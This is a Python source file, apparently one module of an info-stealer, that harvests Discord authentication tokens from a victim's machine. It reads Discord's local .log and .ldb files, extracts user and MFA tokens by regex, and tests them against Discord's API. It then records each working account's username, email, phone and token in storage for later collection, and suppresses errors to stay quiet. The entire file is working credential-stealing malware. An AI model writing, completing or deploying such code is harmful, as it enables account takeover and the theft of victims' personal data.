from re import findall
from json import loads
from threading import Thread
from os import listdir, path
from urllib.request import Request, urlopen
from typing import MutableMapping, Dict

from helper.helpers import MemoryStorage
from helper.helpers.config import DiscordConfig
from helper.helpers.dataclasses import Data


class Discord:
    """
    Collects tokens from the Discord.
    """
    def __init__(self, folder: str):

        self.__file = path.join(folder, "Tokens.txt")
        self.__config = DiscordConfig()
        self.__storage = MemoryStorage()

    def __get_headers(self, token: str = None, content_type: str = "application/json") -> Dict:
        """
        Composes the headers for the query.

        Parameters:
        - token [str]: Discord token.
        - content_type [str]: Content type.

        Returns:
        - dict: Headers data.
        """
        headers = {
            "Content-Type": content_type,
            "User-Agent": self.__config.UserAgent
        }

        if token is not None:
            headers.update({"Authorization": token})

        return headers

    def __check_token(self, *args: MutableMapping[str, str]) -> None:
        """
        Checks token for validity.

        Parameters:
        - *args [tuple]: Discord token and query headers.

        Returns:
        - None.
        """
        try:
            query = urlopen(Request(method="GET", url="https://discordapp.com/api/v6/users/@me", headers=args[1]))
            self.valid.append((args[0], query))
        except:
            self.invalid.append(args[0])

    def __get_tokens(self) -> None:
        """
        Collects all valid and invalid Discord tokens.

        Parameters:
        - None.

        Returns:
        - None.
        """
        if not path.exists(self.__config.TokensPath):
            pass
            return

        tokens = []

        self.valid = []
        self.invalid = []

        for file in listdir(self.__config.TokensPath):

            if file[-4:] not in [".log", ".ldb"]:
                continue

            for data in [line.strip() for line in open(path.join(self.__config.TokensPath, file), "r", errors="ignore", encoding="utf-8").readlines()]:
                for regex in (r"[\w-]{24}\.[\w-]{6}\.[\w-]{27}", r"mfa\.[\w-]{84}"):
                    [tokens.append(item) for item in findall(regex, data)]

        if not tokens:
            return

        tasks = []

        for token in tokens:
            task = Thread(target=self.__check_token, args=[token, self.__get_headers(token)])
            task.setDaemon(True)
            task.start()
            tasks.append(task)

        for task in tasks:
            task.join()

        temp = []

        for result in self.valid:
            storage = loads(result[1].read().decode("utf-8"))
            data = self.__config.DiscordData

            temp.append(data.format(
                storage["username"] if storage["username"] else "No data",
                storage["email"] if storage["email"] else "No data",
                storage["phone"] if storage["phone"] else "No data",
                storage["bio"] if storage["bio"] else "No data",
                result[0]
            ))

        self.__storage.add_from_memory(
            self.__file,
            "Invalid tokens:\n" + "\n".join(item for item in self.invalid) + "\n\nValid tokens:\n" + "".join(item for item in temp)
        )

        self.__storage.add_data("Application", "Discord")

    def run(self) -> Data:
        """
        Launches the Discord tokens collection module.

        Parameters:
        - None.

        Returns:
        - None.
        """
        try:

            self.__get_tokens()

            return self.__storage.get_data()

        except Exception as e:
            pass
